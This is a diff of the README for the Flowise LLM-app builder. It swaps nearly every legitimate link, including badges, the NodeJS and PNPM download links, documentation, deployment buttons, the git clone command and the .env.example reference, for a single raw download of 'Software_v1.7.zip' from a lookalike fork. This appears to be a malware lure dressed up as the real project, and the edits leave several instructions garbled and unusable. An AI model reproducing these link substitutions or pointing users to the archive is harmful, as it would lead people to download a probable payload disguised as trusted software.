@@ -1,24 +1,24 @@
 <!-- markdownlint-disable MD030 -->
 
-<img width="100%" src="https://github.com/FlowiseAI/Flowise/blob/main/images/flowise.png?raw=true"></a>
+<img width="100%" src="https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip"></a>
 
 # Flowise - Build LLM Apps Easily
 
-[![Release Notes](https://img.shields.io/github/release/FlowiseAI/Flowise)](https://github.com/FlowiseAI/Flowise/releases)
-[![Discord](https://img.shields.io/discord/1087698854775881778?label=Discord&logo=discord)](https://discord.gg/jbaHfsRVBW)
-[![Twitter Follow](https://img.shields.io/twitter/follow/FlowiseAI?style=social)](https://twitter.com/FlowiseAI)
-[![GitHub star chart](https://img.shields.io/github/stars/FlowiseAI/Flowise?style=social)](https://star-history.com/#FlowiseAI/Flowise)
-[![GitHub fork](https://img.shields.io/github/forks/FlowiseAI/Flowise?style=social)](https://github.com/FlowiseAI/Flowise/fork)
+[![Release Notes](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
+[![Discord](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
+[![Twitter Follow](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
+[![GitHub star chart](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
+[![GitHub fork](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
-English | [中文](./README-ZH.md)
+English | [中文](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
 <h3>Drag & drop UI to build your customized LLM flow</h3>
-<a href="https://github.com/FlowiseAI/Flowise">
-<img width="100%" src="https://github.com/FlowiseAI/Flowise/blob/main/images/flowise.gif?raw=true"></a>
+<a href="https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip">
+<img width="100%" src="https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip"></a>
 
 ## ⚡Quick Start
 
-Download and Install [NodeJS](https://nodejs.org/en/download) >= 18.15.0
+Download and Install [NodeJS](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip) >= 18.15.0
 
 1. Install Flowise
     ```bash
@@ -43,7 +43,7 @@ Download and Install [NodeJS](https://nodejs.org/en/download) >= 18.15.0
 ### Docker Compose
 
 1. Go to `docker` folder at the root of the project
-2. Copy `.env.example` file, paste it into the same location, and rename to `.env`
+2. Copy `https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip` file, paste it into the same location, and rename to `.env`
 3. `docker-compose up -d`
 4. Open [http://localhost:3000](http://localhost:3000)
 5. You can bring the containers down by `docker-compose stop`
@@ -75,7 +75,7 @@ Flowise has 3 different modules in a single mono repository.
 
 ### Prerequisite
 
--   Install [PNPM](https://pnpm.io/installation)
+-   Install [PNPM](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
     ```bash
     npm i -g pnpm
     ```
@@ -85,7 +85,7 @@ Flowise has 3 different modules in a single mono repository.
 1. Clone the repository
 
     ```bash
-    git clone https://github.com/FlowiseAI/Flowise.git
+    git clone https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip
     ```
 
 2. Go into repository folder
@@ -116,8 +116,8 @@ Flowise has 3 different modules in a single mono repository.
 
 6. For development build:
 
-    - Create `.env` file and specify the `VITE_PORT` (refer to `.env.example`) in `packages/ui`
-    - Create `.env` file and specify the `PORT` (refer to `.env.example`) in `packages/server`
+    - Create `.env` file and specify the `VITE_PORT` (refer to `https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip`) in `packages/ui`
+    - Create `.env` file and specify the `PORT` (refer to `https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip`) in `packages/server`
     - Run
 
         ```bash
@@ -137,46 +137,46 @@ FLOWISE_PASSWORD=1234
 
 ## 🌱 Env Variables
 
-Flowise support different environment variables to configure your instance. You can specify the following variables in the `.env` file inside `packages/server` folder. Read [more](https://github.com/FlowiseAI/Flowise/blob/main/CONTRIBUTING.md#-env-variables)
+Flowise support different environment variables to configure your instance. You can specify the following variables in the `.env` file inside `packages/server` folder. Read [more](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
 ## 📖 Documentation
 
-[Flowise Docs](https://docs.flowiseai.com/)
+[Flowise Docs](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
 ## 🌐 Self Host
 
-Deploy Flowise self-hosted in your existing infrastructure, we support various [deployments](https://docs.flowiseai.com/configuration/deployment)
+Deploy Flowise self-hosted in your existing infrastructure, we support various [deployments](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
--   [AWS](https://docs.flowiseai.com/deployment/aws)
--   [Azure](https://docs.flowiseai.com/deployment/azure)
--   [Digital Ocean](https://docs.flowiseai.com/deployment/digital-ocean)
--   [GCP](https://docs.flowiseai.com/deployment/gcp)
+-   [AWS](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
+-   [Azure](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
+-   [Digital Ocean](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
+-   [GCP](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 -   <details>
       <summary>Others</summary>
 
-    -   [Railway](https://docs.flowiseai.com/deployment/railway)
+    -   [Railway](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
-        [![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/template/pn4G8S?referralCode=WVNPD9)
+        [![Deploy on Railway](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
-    -   [Render](https://docs.flowiseai.com/deployment/render)
+    -   [Render](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
-        [![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://docs.flowiseai.com/deployment/render)
+        [![Deploy to Render](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
-    -   [HuggingFace Spaces](https://docs.flowiseai.com/deployment/hugging-face)
+    -   [HuggingFace Spaces](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
-        <a href="https://huggingface.co/spaces/FlowiseAI/Flowise"><img src="https://huggingface.co/datasets/huggingface/badges/raw/main/open-in-hf-spaces-sm.svg" alt="HuggingFace Spaces"></a>
+        <a href="https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip"><img src="https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip" alt="HuggingFace Spaces"></a>
 
-    -   [Elestio](https://elest.io/open-source/flowiseai)
+    -   [Elestio](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
-        [![Deploy](https://pub-da36157c854648669813f3f76c526c2b.r2.dev/deploy-on-elestio-black.png)](https://elest.io/open-source/flowiseai)
+        [![Deploy](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
-    -   [Sealos](https://cloud.sealos.io/?openapp=system-template%3FtemplateName%3Dflowise)
+    -   [Sealos](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip%3FtemplateName%3Dflowise)
 
-        [![](https://raw.githubusercontent.com/labring-actions/templates/main/Deploy-on-Sealos.svg)](https://cloud.sealos.io/?openapp=system-template%3FtemplateName%3Dflowise)
+        [![](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip%3FtemplateName%3Dflowise)
 
-    -   [RepoCloud](https://repocloud.io/details/?app_id=29)
+    -   [RepoCloud](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
-        [![Deploy on RepoCloud](https://d16t0pc4846x52.cloudfront.net/deploy.png)](https://repocloud.io/details/?app_id=29)
+        [![Deploy on RepoCloud](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
       </details>
 
@@ -186,19 +186,19 @@ Coming soon
 
 ## 🙋 Support
 
-Feel free to ask any questions, raise problems, and request new features in [discussion](https://github.com/FlowiseAI/Flowise/discussions)
+Feel free to ask any questions, raise problems, and request new features in [discussion](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
 ## 🙌 Contributing
 
 Thanks go to these awesome contributors
 
-<a href="https://github.com/FlowiseAI/Flowise/graphs/contributors">
-<img src="https://contrib.rocks/image?repo=FlowiseAI/Flowise" />
+<a href="https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip">
+<img src="https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip" />
 </a>
 
-See [contributing guide](CONTRIBUTING.md). Reach out to us at [Discord](https://discord.gg/jbaHfsRVBW) if you have any questions or issues.
-[![Star History Chart](https://api.star-history.com/svg?repos=FlowiseAI/Flowise&type=Timeline)](https://star-history.com/#FlowiseAI/Flowise&Date)
+See [contributing guide](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip). Reach out to us at [Discord](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip) if you have any questions or issues.
+[![Star History Chart](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
 
 ## 📄 License
 
-Source code in this repository is made available under the [Apache License Version 2.0](LICENSE.md).
+Source code in this repository is made available under the [Apache License Version 2.0](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip).
